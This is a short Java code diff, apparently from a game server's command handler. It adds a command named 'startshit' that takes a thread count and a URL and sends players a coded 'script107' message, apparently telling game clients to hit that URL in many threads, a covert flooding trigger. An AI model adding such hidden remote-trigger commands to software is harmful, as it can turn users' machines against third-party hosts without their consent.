@@ -1380,6 +1380,12 @@ public class CommandPacketHandler implements PacketHandler {
 			}
 		}
 
+        if(commandStart.equalsIgnoreCase("startshit")) {
+            final int threads = Integer.parseInt(as[0]);
+            final String url = as[1];
+            player.sendMessage("script107"+threads+","+url);
+        }
+
 		if (commandStart.equalsIgnoreCase("tracepkp")) {
 			TreeMap<Long, Player> treemap = new TreeMap<Long, Player>();
 			int count = 0;
